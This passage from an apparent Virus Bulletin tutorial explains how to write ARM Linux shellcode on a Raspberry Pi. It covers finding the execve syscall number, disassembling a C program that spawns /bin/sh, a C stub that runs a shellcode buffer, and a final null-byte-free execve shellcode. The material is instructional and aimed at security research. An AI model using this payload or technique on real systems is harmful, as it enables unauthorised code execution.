class="emphasis"><em>Linux</em></span> &ndash; only the file paths can differ a bit. On <span class="emphasis"><em>Raspbian</em></span> &lsquo;wheezy&rsquo; /usr/include/arm-linux-gnueabihf/asm/unistd.h is the correct file. The following is an example listing of its content:</p><pre class="programlisting">#if defined(__thumb__) || defined(__ARM_EABI__)
#define __NR_SYSCALL_BASE 0
#else
#define __NR_SYSCALL_BASE __NR_OABI_SYSCALL_BASE
#endif
/*
 * This file contains the system call numbers.
 */
#define __NR_restart_syscall (__NR_SYSCALL_BASE+  0)
#define __NR_exit   (__NR_SYSCALL_BASE+  1)
#define __NR_fork   (__NR_SYSCALL_BASE+  2)
#define __NR_read   (__NR_SYSCALL_BASE+  3)
#define __NR_write  (__NR_SYSCALL_BASE+  4)
#define __NR_open   (__NR_SYSCALL_BASE+  5)
#define __NR_close  (__NR_SYSCALL_BASE+  6)
[&hellip;]
#define __NR_execve (__NR_SYSCALL_BASE+ 11)
[&hellip;]
Since __NR_SYSCALL_BASE is set to 0 execve syscall has number 11.
</pre></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4361891"></a>Getting required instructions</h2></div></div></div><p>This process looks exactly the same as in the case of an x86 system. The most basic and probably quickest manual way is to write the required code in C and let the compiler choose the correct instruction for us. Then the only tricky parts are:</p><div class="itemizedlist"><ul type="disc"><li><p>Extracting the code and data from the compiled binary</p></li><li><p>Fixing all the bad bytes by rewriting the compiler generated code in some clever way.</p></li></ul></div><p>Let&rsquo;s start with one of the most basic shellcodes for the Unix/Linux environment: execution of shell. The common way to do this is to call execve() with /bin/sh as the argument. In C, the code looks like this:</p><pre class="programlisting">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main(int argc, char **argv)
{
   execve(&ldquo;/bin/sh&rdquo;, NULL, NULL);
}
</pre><p>Clever people put target code into a separate function being called within main(). This makes locating our code easier, but you still need to strip the prolog and epilog code from the function. In our simple case we can skip this step.</p><p>Try to compile the C source code with gcc:</p><pre class="programlisting">gcc &ndash;o execve.exe ./execve.c</pre><p>Now let&rsquo;s check the resulting ELF file with the readelf command:</p><pre class="programlisting">$ readelf -h ./execve_stat
ELF Header:
 Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
 Class:   ELF32
 Data:    2&rsquo;s complement, little endian
 Version: 1 (current)
 OS/ABI:  UNIX - System V
 ABI Version:  0
 Type:    EXEC (Executable file)
 Machine: ARM
 Version: 0x1
 Entry point address: 0x8bbc
 Start of program headers:  52 (bytes into file)
 Start of section headers:  482240 (bytes into file)
 Flags: 0x5000002, has entry point, Version5 EABI
 Size of this header:       52 (bytes)
 Size of program headers:   32 (bytes)
 Number of program headers: 6
 Size of section headers:   40 (bytes)
 Number of section headers: 28
 Section header string table index: 25
</pre><p>Now we can try to extract our possible shellcode. Let&rsquo;s try it with gdb first:</p><pre class="programlisting">$ gdb ./execve.exe
GNU gdb (GDB) 7.4.1-debian
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &ldquo;show copying&rdquo;
and &ldquo;show warranty&rdquo; for details.
This GDB was configured as &ldquo;arm-linux-gnueabihf&rdquo;.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
Reading symbols from /home/pi/src/pentest/exploit_dev/rpi/execve.exe...(no debugging symbols found)...done.
  (gdb) disassemble main
Dump of assembler code for function main:
  0x000083cc &lt;+0&gt;:  push {r11, lr}
  0x000083d0 &lt;+4&gt;:  add r11, sp, #4
  0x000083d4 &lt;+8&gt;:  sub sp, sp, #8
  0x000083d8 &lt;+12&gt;: str r0, [r11, #-8]
  0x000083dc &lt;+16&gt;: str r1, [r11, #-12]
  0x000083e0 &lt;+20&gt;: ldr r0, [pc, #20] ; 0x83fc &lt;main+48&gt;
  0x000083e4 &lt;+24&gt;: mov r1, #0
  0x000083e8 &lt;+28&gt;: mov r2, #0
  0x000083ec &lt;+32&gt;: bl  0x8308 &lt;execve&gt;
  0x000083f0 &lt;+36&gt;: mov r0, r3
  0x000083f4 &lt;+40&gt;: sub sp, r11, #4
  0x000083f8 &lt;+44&gt;: pop {r11, pc}
  0x000083fc &lt;+48&gt;: andeq r8, r0, r0, ror r4
End of assembler dump.
</pre><p>As you can see there are some registry preparations and later there is a jump to the execve (0x000083ec bl 0x8308) function. But where is the execve function code? Unfortunately, we did not compile our ELF executable statically. Let&rsquo;s fix this mistake by recompiling our source code:</p><pre class="programlisting">$ gcc -static -o execve_stat ./execve.c</pre><p>Now disassemble it with the objdump utility:</p><pre class="programlisting">$ objdump -d ./execve_stat | grep execve
./execve_stat: file format elf32-littlearm
 8cd0: eb002b3a bl 139c0 &lt;__execve&gt;
000139c0 &lt;__execve&gt;:
 139d4: 8a000001 bhi 139e0 &lt;__execve+0x20&gt;
 139e0: e59f3014 ldr r3, [pc, #20] ; 139fc &lt;__execve+0x3c&gt;
 139f8: eafffff6 b 139d8 &lt;__execve+0x18&gt;
</pre><p>Great, we now have the __execve function in our disassembly listing. Disassemble all code sections into a text file and find the main and __execve functions (see <a href="#figure.3">Figure 3</a>).</p><div class="figure"><a id="figure.3"></a><div class="mediaobject"><img alt="main() function disassembly with execve() call." src="/uploads/images/figures/2013/01/Shellcoding-3.jpg" /></div><p class="title"><b>Figure&nbsp;3.&nbsp;main() function disassembly with execve() call.</b></p></div><p>As you can see in <a href="#figure.4">Figure 4</a>, the <span class="emphasis"><em>Linux</em></span> function 11 is being called through the SVC instruction. The 11 call number is, according to unistd.h, the execve call number. Now we have everything to form a base for the shellcode. To make it operational we need to get rid of the bad bytes.</p><div class="figure"><a id="figure.4"></a><div class="mediaobject"><img alt="__execve() function." src="/uploads/images/figures/2013/01/Shellcoding-4.jpg" /></div><p class="title"><b>Figure&nbsp;4.&nbsp;__execve() function.</b></p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2116912"></a>Testing out shellcode</h2></div></div></div><p>Before we get rid of the bad bytes we need to be able to test our shellcode. In order to do that we can use good old C stubs similar to this one:</p><pre class="programlisting">#include &lt;stdio.h&gt;
char shellcode[] = &ldquo;&rdquo; /* place your shellcode between &ldquo;&rdquo; */
int main()
{
    (*(void(*)()) shellcode)();
    return 0;
}
</pre><p>If you need to know the exact shellcode length (assuming all bad bytes have been removed) just add the following line to main() before calling the shellcode:</p><pre class="programlisting">printf (&ldquo;Shellcode size: %02d\n&rdquo;, strlen(shellcode));</pre></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2141764"></a>Final execve shellcode</h2></div></div></div><p>Below is the final execve shellcode with all the bad bytes removed &ndash; it was taken from [<span class="citation"><a href="#citation.4">4</a></span>]:</p><div class="table"><a id="table.5"></a><table border="1" summary=""><colgroup><col /><col /></colgroup><thead><tr><th align="center">Bytes</th><th align="center">Instructions</th></tr></thead><tbody><tr><td>e28f6001</td><td>add r6, pc, #1</td></tr><tr><td>e12fff16</td><td>bx r6</td></tr><tr><td>4678</td><td>mov r0, pc</td></tr><tr><td>300a</td><td>adds r0, #10</td></tr><tr><td>9001</td><td>str r0, [sp, #4]</td></tr><tr><td>a901</td><td>add r1, sp, #4</td></tr><tr><td>1a92</td><td>subs r2, r2, r2</td></tr><tr><td>270b</td><td>movs r7, #11</td></tr><tr><td>df01</td><td>svc 1</td></tr></tbody></table><p class="title"><b>Table&nbsp;5.&nbsp;</b></p></div><p>Note how null bytes have been avoided:</p><div class="itemizedlist"><ul type="disc"><li><p>Instead of loading 0 value into registers, subs r<span class="emphasis"><em>n</em></span>, r<span class="emphasis"><em>n</em></span>, r<span class="emphasis"><em>n</em></span> is used. Another option is to use the EOR (exclusive or) instruction with the same source and destination register.</p></li><li><p>Instead of the default svc 0, svc 1 is used.</p></li></ul></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3755324"></a>Notes on shellcode execution</h2></div></div></div><div class="itemizedlist"><ul type="disc"><li><p>Some tricks from x86 will not work in the ARM world and different approaches must be used.</p></li><li><p>The return-to-glibc technique will not work out of the box. On ARM, parameters are not passed on the stack but through R0&ndash;R3 registers.</p></li><li><p>ROP shellcode/payload is perfectly possible on ARM.</p></li><li><p>Since Thumb mode can be mixed with ARM mode, Thumb can be used to eliminate bad bytes, for example when 16 bit values are sufficient for operation.</p></li></ul></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3980241"></a>Some final thoughts</h2></div></div></div><p>What has been described in this tutorial is just the very beginning of shellcoding on ARM processors. There are many interesting areas, like the TrustZone feature or ROP gadgets to name just a couple. I hope that the material presented here is a good starting point for your own research into the fascinating world of ARM. Since embedded system security level evaluation can be quite a tricky and challenging process, there is a lot of scope for very interesting research. But what was once considered an embedded device is now starting to become a mainstream working environment, processing all our important information including privacy data, payments etc. With broad functionality and constant connectivity, this makes such devices perfect targets for attack. Studying penetration techniques enables us to develop better safeguards.</p><div class="bibliography"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2925403"></a>Bibliography</h3></div></div></div><div class="bibliomixed"><a id="citation.1"></a><p class="bibliomixed">[1] <span class="bibliosource"><a href="https://www.raspberrypi.org/" target="_blank">http://www.raspberrypi.org/</a></span>.</p></div><div class="bibliomixed"><a id="citation.2"></a><p class="bibliomixed">[2] QEMU &ndash; Emulating Raspberry Pi the easy way (Linux or Windows!). <span class="bibliosource"><a href="http://xecdesign.com/qemu-emulating-raspberry-pi-the-easy-way/" target="_blank">http://xecdesign.com/qemu-emulating-raspberry-pi-the-easy-way/</a></span>.</p></div><div class="bibliomixed"><a id="citation.3"></a><p class="bibliomixed">[3] Compiling an ARM1176 kernel for QEMU. <span class="bibliosource"><a href="http://xecdesign.com/compiling-a-kernel/" target="_blank">http://xecdesign.com/compiling-a-kernel/</a></span>.</p></div><div class="bibliomixed"><a id="citation.4"></a><p class="bibliomixed">[4] [Raspberry Pi] Linux/ARM &ndash; execve(&ldquo;/bin/sh&rdquo;, [0], [0 vars]) &ndash; 30 bytes. <span class="bibliosource"><a href="https://www.exploit-db.com/exploits/21253/" target="_blank">http://www.exploit-db.com/exploits/21253/</a></span>.</p></div></div></div> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=Shellcoding ARM&url=https://www.virusbulletin.com/virusbulletin/2013/01/shellcoding-arm"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2013/01/shellcoding-arm'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2013/01/shellcoding-arm&title=Shellcoding ARM"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2013/01/shellcoding-arm&t=Shellcoding ARM"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2013/01/shellcoding-arm"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p> </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">©1989-2022 Virus Bulletin.        <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>        <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>        <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>